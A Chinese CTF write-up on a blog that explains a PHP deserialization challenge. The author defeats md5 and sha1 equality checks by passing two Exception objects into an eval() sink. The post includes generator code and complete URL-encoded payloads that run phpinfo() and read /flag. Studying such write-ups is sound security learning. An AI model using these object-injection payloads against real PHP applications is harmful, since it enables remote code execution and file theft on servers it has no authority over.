# 原创
：  Exception类绕过md5、sha1等

# Exception类绕过md5、sha1等

**源码：**

```
&lt;?php
show_source(__FILE__);
class CDUTSEC
{
    public $var1;
    public $var2;

    function __construct($var1, $var2)
    {
        $var1 = $var1;
        $var2 = $var2;
    }

    function __destruct()
    {
        echo md5($this-&gt;var1);
        echo md5($this-&gt;var2);
        if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2))) {
            eval($this-&gt;var1);
        }
    }
}

unserialize($_GET['payload']);

Notice: Undefined index: payload in /var/www/html/index.php on line 24

```

**代码审计：**<br/> 这里与[前一题](https://blog.csdn.net/LYJ20010728/article/details/114492485?spm=1001.2014.3001.5501)相比，多了一个sha1绕过，但是fastcoll是不能满足sha1绕过的。<br/> 这里我们采用Exception类绕过md5、sha1等系列。<br/> **解题：**

```
&lt;?php
class CDUTSEC
{
    public $var1;
    public $var2;
} 

$cmd="phpinfo();?&gt;";
$a = new Exception($cmd);
$b = new Exception($cmd,1);

$tr = new CDUTSEC();
$tr-&gt;var1=$a;
$tr-&gt;var2=$b;

echo urlencode(serialize($tr));

```

代码运行得到payload：`O%3A7%3A%22CDUTSEC%22%3A2%3A%7Bs%3A4%3A%22var1%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A12%3A%22phpinfo%28%29%3B%3F%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5Csublime%5CSublime+Text+3%5C%E4%BB%A3%E7%A0%81%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A4%3A%22var2%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A12%3A%22phpinfo%28%29%3B%3F%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5Csublime%5CSublime+Text+3%5C%E4%BB%A3%E7%A0%81%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D`<br/> 测试payload：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210307190253197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> 说明思路是正确的，接着我们将`phpinfo();?&gt;`换成`readfile('/flag');?&gt;`：

```
&lt;?php
class CDUTSEC
{
    public $var1;
    public $var2;
} 

$cmd="readfile('/flag');?&gt;";
$a = new Exception($cmd);$b = new Exception($cmd,1);

$tr = new CDUTSEC();
$tr-&gt;var1=$a;
$tr-&gt;var2=$b;
echo urlencode(serialize($tr));

```

运行代码得到payload：`O%3A7%3A%22CDUTSEC%22%3A2%3A%7Bs%3A4%3A%22var1%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22readfile%28%27%2Fflag%27%29%3B%3F%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5Csublime%5CSublime+Text+3%5C%E4%BB%A3%E7%A0%81%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A4%3A%22var2%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22readfile%28%27%2Fflag%27%29%3B%3F%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A41%3A%22D%3A%5Csublime%5CSublime+Text+3%5C%E4%BB%A3%E7%A0%81%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D`<br/> 执行payload：<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210307190559423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
